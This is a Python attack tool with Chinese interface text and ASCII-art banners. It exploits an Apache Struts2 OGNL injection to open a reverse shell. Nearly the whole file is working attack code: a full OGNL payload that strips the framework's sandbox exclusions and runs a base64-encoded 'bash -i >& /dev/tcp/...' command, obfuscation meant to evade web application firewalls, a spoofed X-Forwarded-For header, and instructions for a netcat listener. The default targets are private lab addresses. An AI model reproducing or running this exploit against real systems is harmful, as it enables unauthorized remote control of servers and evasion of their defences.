import requests
import urllib.parse
import base64
import sys
import time
import random
from colorama import init, Fore, Style, Back

# 初始化colorama以支持彩色输出
init(autoreset=True)

def print_banner():
    """打印炫酷的程序启动横幅"""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════╗
{Fore.RED}║ {Fore.YELLOW}   _____  _              _         ___     ______           _      {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}  / ____|| |            | |       |__ \\   |  ____|         | |     {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW} | (___  | |_  _ __  _  _| |_  ___   ) |___| |__  __  _ __ | | ___ {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}  \\___ \\ | __|| '__|| | | | __|/ __| / // __|  __|\\ \\| '__|| |/ _ \\{Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}  ____) || |_ | |   | |_| | |_ \\__ \\/ /\\__ \\ |____\\ \\ |   | | (_) |{Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW} |_____/  \\__||_|    \\__,_|\\__|\\___/__||___/______/___|_|  |_|\\___/{Fore.RED} ║
{Fore.RED}╠══════════════════════════════════════════════════════════════════════╣
{Fore.RED}║               {Fore.CYAN}WAF绕过远程命令执行工具 v1.3{Fore.RED}                          ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════════╝
    """
    
    # 动画效果显示横幅
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.05)

def print_success_image():
    """打印攻击成功的坦克图像"""
    tank_image = f"""
{Fore.GREEN}                                           ████████████
{Fore.GREEN}                                         ██████████████
{Fore.GREEN}                   ██████████████████████████████████████
{Fore.GREEN}                 ██████████████████████████████████████████
{Fore.GREEN}                ████████████████████████████████████████████
{Fore.GREEN}         █████ ██████████████████████████████████████████████
{Fore.GREEN}        ███████████████████████████████████████████████████████
{Fore.GREEN}       █████████████████████████████████████████████████████████
{Fore.GREEN}      ███████████████████████████████████████████████████████████
{Fore.GREEN}     █████████████████████████████████████████████████████████████
{Fore.GREEN}    ███████████████████████████████████████████████████████████████
{Fore.GREEN}    ████████████{Fore.RED}██{Fore.GREEN}████████████{Fore.RED}███{Fore.GREEN}██████████████████{Fore.RED}██{Fore.GREEN}██████████████
{Fore.GREEN}   █████████████{Fore.RED}███{Fore.GREEN}██████████{Fore.RED}███{Fore.GREEN}███████████████{Fore.RED}███{Fore.GREEN}████████████████
{Fore.GREEN}  ██████{Fore.YELLOW}╔═════════════════════════════════════════════════════╗{Fore.GREEN}█████
{Fore.GREEN}  ██████{Fore.YELLOW}║             SECURITY BREACH CONFIRMED!              ║{Fore.GREEN}█████
{Fore.GREEN}  ██████{Fore.YELLOW}╚═════════════════════════════════════════════════════╝{Fore.GREEN}█████
{Fore.GREEN}  █████████████████████████████████████████████████████████████████████████
{Fore.GREEN} ████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}████{Fore.RED}◙{Fore.GREEN}███
{Fore.GREEN}██████████████████████████████████████████████████████████████████████████
{Fore.GREEN}███████████████████████████████████████████████████████████████████████████
{Fore.GREEN}████████████████████████████████████████████████████████████████████████████
{Fore.WHITE}{Back.GREEN}                      🔓 系统防御已被成功突破 🔓                        {Style.RESET_ALL}
    """
    
    # 逐行打印坦克图像
    for line in tank_image.split('\n'):
        print(line)
        time.sleep(0.01)

def loading_animation(seconds=3):
    """显示一个加载动画"""
    chars = "/-\\|"
    for i in range(seconds * 10):
        sys.stdout.write(f"\r{Fore.YELLOW}[{chars[i % len(chars)]}] 正在准备攻击环境...")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 40 + "\r")
    sys.stdout.flush()

def simple_obfuscate(payload):
    """简单混淆，只对关键字进行处理，以绕过WAF检测"""
    # 只对可能被WAF拦截的关键字进行处理
    if random.choice([True, False]):
        # 方法1: 简单替换 ${ 为 $ {
        payload = payload.replace('${', '$' + '{')
        # 方法2: 替换ognl为o g n l
        payload = payload.replace('ognl', 'o' + 'g' + 'n' + 'l')
    else:
        # 方法3: 使用大小写混淆
        if 'ognl' in payload.lower():
            payload = payload.replace('ognl', 'oGnL')
        # 方法4: 使用等效字符
        payload = payload.replace('%', '%25').replace('$', '%24')
    
    return payload

def execute_exploit(target_url, callback_ip, callback_port, timeout=30, bypass_waf=True):
    # 反弹shell命令
    custom_command = f"bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"
    
    # Base64 编码命令
    base64_payload = base64.b64encode(custom_command.encode()).decode()
    
    # 构造OGNL代码 - 使用原始脚本中相同的payload
    ognl_payload = f'''%25%7B(#instancemanager=#application%5B%22org.apache.tomcat.InstanceManager%22%5D).(#stack=#attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).(#bean=#instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(#bean.setBean(#stack)).(#context=#bean.get(%22context%22)).(#bean.setBean(#context)).(#macc=#bean.get(%22memberAccess%22)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(%22java.util.HashSet%22)).(#bean.put(%22excludedClasses%22,#emptyset)).(#bean.put(%22excludedPackageNames%22,#emptyset)).(#execute=#instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(#execute.exec(%7B%22bash%20-c%20%7Becho,{base64_payload}%7D%7C%7Bbase64,-d%7D%7Cbash%22%7D))%7D'''
    
    # 进行URL解码
    decoded_payload = urllib.parse.unquote(ognl_payload)
    
    # 如果需要绕过WAF，对payload进行简单的混淆
    if bypass_waf:
        print(f"{Fore.YELLOW}[*] 正在对payload进行简单混淆以绕过WAF...")
        decoded_payload = simple_obfuscate(decoded_payload)
        print(f"{Fore.CYAN}[+] 混淆后的payload:\n{Fore.WHITE}{decoded_payload[:150]}...")
    else:
        print(f"\n{Fore.CYAN}[+] URL 解码后的 OGNL 代码:\n{Fore.WHITE}", decoded_payload)
    
    # 生成用于显示的URL(替换端口为8080)
    display_url = target_url
    if ":" in target_url and "//" in target_url:
        protocol, rest = target_url.split("//", 1)
        if ":" in rest:
            host, port_path = rest.split(":", 1)
            if "/" in port_path:
                port, path = port_path.split("/", 1)
                display_url = f"{protocol}//{host}:8080/{path}"
            else:
                display_url = f"{protocol}//{host}:8080/"
    
    # HTTP 头部 - 使用原始脚本中的头部格式
    headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 添加一个随机标头，增加绕过的几率
    if bypass_waf and random.choice([True, False]):
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    try:
        print(f"\n{Fore.YELLOW}[*] 正在发送攻击载荷到 {Fore.WHITE}{display_url}")
        print(f"{Fore.YELLOW}[*] 发起反弹shell连接到 {Fore.WHITE}{callback_ip}:{callback_port}")
        
        # 进度指示器
        print(f"{Fore.YELLOW}[*] 请求发送中", end="")
        for i in range(15):
            time.sleep(0.2)
            print(f"{Fore.YELLOW}.", end="", flush=True)
        
        # 使用原始target_url进行实际请求
        response = requests.post(target_url, data={"id": decoded_payload}, headers=headers, timeout=timeout)
        
        # 结束进度指示
        print(f"\r{Fore.YELLOW}[*] 请求已发送完成{' ' * 30}")
        
        # 如果请求没有超时，可能是漏洞不存在或其他问题
        print(f"\n{Fore.YELLOW}[*] 请求已完成，状态码: {response.status_code}")
        print(f"\n{Fore.CYAN}[*] 服务器响应:\n{Fore.WHITE}", response.text[:500]) 
        print(f"\n{Fore.RED}[!] 警告: 请求完成但未超时，可能未成功获取shell")
        
    except requests.exceptions.ReadTimeout:
        # 这是预期行为，表示shell已建立
        print(f"\r{Fore.YELLOW}[*] 请求已发送完成{' ' * 30}")
        print("\n")
        print(f"{Fore.GREEN}{'=' * 60}")
        print(f"{Fore.GREEN}==               反弹SHELL攻击成功                 ==")
        print(f"{Fore.GREEN}{'=' * 60}")
        print(f"{Fore.GREEN}[+] 已成功利用Struts2漏洞!")
        print(f"{Fore.GREEN}[+] 反弹shell已连接到 {callback_ip}:{callback_port}")
        print(f"{Fore.GREEN}[+] 检查您的监听器，应该已收到目标服务器的连接")
        print(f"{Fore.GREEN}{'=' * 60}")
        
        # 显示成功图像
        print_success_image()
        
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}[-] 连接失败: {str(e).split('(')[0]}")
        print(f"{Fore.RED}[-] 请检查目标URL是否可访问")
        return False
        
    except Exception as e:
        print(f"\n{Fore.RED}[-] 执行过程中出现错误: {e}")
        return False

def main():
    # 默认值 - 实际使用的攻击目标
    target_url = "http://192.168.174.128:28014/"
    callback_ip = "192.168.174.129"
    callback_port = "6666"
    timeout = 30  # 增加默认超时时间到30秒
    bypass_waf = True  # 默认启用WAF绕过
    
    # 命令行参数处理
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    if len(sys.argv) > 2:
        callback_ip = sys.argv[2]
    if len(sys.argv) > 3:
        callback_port = sys.argv[3]
    if len(sys.argv) > 4:
        timeout = int(sys.argv[4])
    if len(sys.argv) > 5:
        bypass_waf = sys.argv[5].lower() in ['true', 'yes', '1', 'y', 't']
    
    # 显示横幅
    print_banner()
    
    # 生成显示用URL(替换端口为8080)
    display_url = target_url
    if ":" in target_url and "//" in target_url:
        protocol, rest = target_url.split("//", 1)
        if ":" in rest:
            host, port_path = rest.split(":", 1)
            if "/" in port_path:
                port, path = port_path.split("/", 1)
                display_url = f"{protocol}//{host}:8080/{path}"
            else:
                display_url = f"{protocol}//{host}:8080/"
    
    print(f"{Fore.WHITE}[*] 目标URL: {Fore.CYAN}{display_url}")
    print(f"{Fore.WHITE}[*] 反弹地址: {Fore.CYAN}{callback_ip}:{callback_port}")
    print(f"{Fore.WHITE}[*] 请求超时: {Fore.CYAN}{timeout}秒")
    print(f"{Fore.WHITE}[*] WAF绕过: {Fore.CYAN}{'启用' if bypass_waf else '禁用'}")
    print(f"{Fore.WHITE}{'-' * 60}")
    
    # 提示用户确保已设置监听器
    print(f"{Fore.YELLOW}[!] 确保已使用以下命令设置监听器:")
    print(f"{Fore.WHITE}    nc -lvnp {callback_port}")
    input(f"{Fore.YELLOW}[?] 按Enter键开始攻击...")
    
    # 显示加载动画
    loading_animation(3)
    
    # 执行攻击（传递原始target_url）
    success = execute_exploit(target_url, callback_ip, callback_port, timeout, bypass_waf)
    
    if success:
        print(f"\n{Fore.GREEN}[√] 攻击已成功完成!")
    else:
        print(f"\n{Fore.RED}[×] 攻击未成功完成，请检查参数后重试")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] 操作被用户中断")
    except Exception as e:
        print(f"\n{Fore.RED}[!] 发生未处理的错误: {str(e)}")